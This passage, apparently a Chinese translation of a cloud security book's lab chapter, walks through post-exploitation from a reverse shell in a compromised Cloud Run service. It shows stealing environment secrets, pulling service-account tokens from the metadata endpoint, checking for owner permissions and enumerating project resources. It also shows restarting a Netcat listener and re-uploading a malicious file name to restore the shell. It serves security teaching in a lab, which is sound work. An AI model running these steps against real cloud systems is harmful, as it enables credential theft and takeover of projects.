

### 13. 通过 `pwd`（print working directory）显示当前工作目录：

```
pwd
```

这会返回 `/app`。

### 14. 列出当前目录的内容：

```
ls
```

这会输出以下内容：

```
main.py
```

### 15. 运行以下命令检查 `main.py` 文件中的代码：

```
cat main.py
```

这会返回 `main.py` 文件的源代码：

```
import os
import subprocess
from flask import Flask, request

app = Flask(__name__)

OUTPUT_BUCKET = os.getenv("OUTPUT_BUCKET")

...
```

### 16. 列出在受损 Cloud Run 服务中设置的所有环境变量：

```
env
```

你应该会得到以下内容：

```
PYTHON_SHA256=...
PYTHON_VERSION=3.10.18
K_REVISION=...
SECRET=PASSWORD123
CLOUD_RUN_TIMEOUT_SECONDS=1200
PWD=/app
...
```

通过枚举受损计算服务的环境变量，攻击者可以窃取凭据（例如 `SECRET=PASSWORD123`）和其他配置值。

#### Note

攻击者还会注意到，受损的 Cloud Run 服务具有 20 分钟的超时设置，这由 `CLOUD_RUN_TIMEOUT_SECONDS` 环境变量的值指示。^[15](#ch09.html#id848)

### 17. 查询元数据端点以检索可用的顶级元数据目录：

```
MD_URL="http://169.254.169.254/computeMetadata/v1"
curl -H "Metadata-Flavor: Google" "$MD_URL/"
```

这会返回以下输出：

```
instance/
oslogin/
project/
universe/
```

你可能需要在反向 shell 会话中运行命令后再次按 Enter 键以显示输出。

### 18. 查询元数据端点以获取服务账号电子邮件地址：

```
SERVICE_ACCOUNT_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
    "$MD_URL/instance/service-accounts/default/email")

echo $SERVICE_ACCOUNT_EMAIL
```

你应该会得到与受损 Cloud Run 服务关联的服务账号电子邮件：

```
html-to-pdf@....iam.gserviceaccount.com
```

### 19. 为与 Cloud Run 服务关联的服务账号检索访问令牌：

```
curl -H "Metadata-Flavor: Google" \
  "$MD_URL/instance/service-accounts/default/token"
```

这会返回以下 JSON 输出：

```
{"access_token":"...","expires_in":...,"token_type":"Bearer"}
```

### 20. 另一种生成访问令牌的方法是通过 `gcloud auth print-access-token` 命令。运行以下命令以检索访问令牌并将其存储在变量中以供以后使用：

```
ACCESS_TOKEN=$(gcloud auth print-access-token)
echo $ACCESS_TOKEN
```

#### Caution

切勿与任何人分享访问令牌。在有效期内，此令牌会授予对项目所有资源和权限的完全访问权限，因为关联的服务账号具有 `roles/owner` 角色。

此时，你拥有一个其权限由服务账号分配的特权决定的访问令牌。由于受损 Cloud Run 服务的服务账号具有 `roles/owner` 角色，你现在实际上拥有对项目的完全管理访问权限。

## Exploring and Inspecting the Project Resources

现在你已经建立了反向 shell 会话，是时候使用在前一节中获得的访问令牌来探索和检查可访问的资源了。在本节中，你将枚举并检查无服务器实验室环境中的云资源，包括 Cloud Storage 存储桶、Pub/Sub 主题和 Parameter Store 参数，如 [Figure 9-7](#ch09.html#exploring-and-inspecting-the-project-resources) 所示。

![](assets/lsse_0907.png)

本节假定你是在反向 shell 会话中运行命令（在 `root@localhost:/app#` 之后）。如果反向 shell 会话意外终止，^[16](#ch09.html#id851) 只需按 Ctrl-C，通过 `nc -lvnp 4444`（在 VM 实例中）重新启动你的 Netcat 监听器，然后从单独的 Cloud Shell 终端标签页重新上传文件（使用构建的恶意文件名）以重新建立连接。

#### Note

如果你在从攻击者账号向指定的输入存储桶上传文件时遇到任何问题，你可能还需要通过运行 `gcloud auth login` 重新进行身份验证。

让我们继续从前一节中离开的地方，并检查与受损 Cloud Run 服务的服务账号关联的项目的资源：

### 1. 检索可访问的 Google Cloud 项目的列表以及它们的 ID、名称和项目编号：

```
gcloud projects list
```

这会返回托管无服务器实验室环境的 Serverless Lab 账号中项目的 ID、名称和编号：

```
PROJECT_ID                  NAME                 PROJECT_NUMBER
*****                       *****                *****
```

### 2. 将配置的 `gcloud` 项目 ID 存储到 `PROJECT_ID` 变量中：

```
PROJECT_ID=$(gcloud config get-value project)
```

### 3. 通过运行以下命令检查你是否具有 `resourcemanager.projects.get` 和 `resourcemanager.projects.getIamPolicy` 权限：

```
ACCESS_TOKEN=$(gcloud auth print-access-token)

RM_URL_BASE="https://cloudresourcemanager.googleapis.com/v1"
RM_URL="$RM_URL_BASE/projects/$PROJECT_ID:testIamPermissions"

PERM1="resourcemanager.projects.get"
PERM2="resourcemanager.projects.getIamPolicy"

PERMISSIONS_JSON="{\"permissions\": [\"${PERM1}\", \"${PERM2}\"]}"

curl -s -X POST \
  -H "Authorization: Bearer $ACCESS_TOKEN" \
  -H "Content-Type: application/json" \
  -d "$PERMISSIONS_JSON" \
  "$RM_URL"
```

这会返回以下 JSON 输出：

```
{
  "permissions": [
    "resourcemanager.projects.get",
    "resourcemanager.projects.getIamPolicy"
  ]
}
```

由于两个权限均已授予，你可以运行 `gcloud projects get-iam-policy` 来检查项目的 IAM 策略。

### 4. 查看分配给受损 Cloud Run 服务的服务账号的所有 IAM 角色：

```
MD_URL="http://169.254.169.254/computeMetadata/v1"
SERVICE_ACCOUNT_EMAIL=$(curl -s -H "Metadata-Flavor: Google" \
    "$MD_URL/instance/service-accounts/default/email")

gcloud projects get-iam-policy $PROJECT_ID \
  --flatten="bindings[].members" \
  --format='table(bindings.role)' \
  --filter="bindings.members:$SERVICE_ACCOUNT_EMAIL"
```

这会返回以下内容：

```
ROLE
roles/owner
```

### 5. 列出当前在活动项目中启用的所有 Google Cloud 服务：

```
gcloud services list --enabled
```

这会返回以下 Google Cloud 服务列表：

```
NAME                                 TITLE
analyticshub.googleapis.com          Analytics Hub API
artifactregistry.googleapis.com      Artifact Registry API
bigquery.googleapis.com              BigQuery API
bigqueryconnection.googleapis.com    BigQuery Connection API

...
```

从这里，攻击者可以推断项目中启用的 Google Cloud 服务。 此信息使他们能够识别哪些服务具有可被针对或可能被利用的资源。

### 6. 检索项目中所有资产的完整列表：

```
gcloud asset search-all-resources \
  --project=$PROJECT_ID \
  --format=json
```

如果出现以下确认提示，输入 `y` 并按 Enter 继续：

```
API [cloudasset.googleapis.com] not enabled on project [...]. Would you
 like to enable and retry (this will take a few minutes)? (y/N)?
```

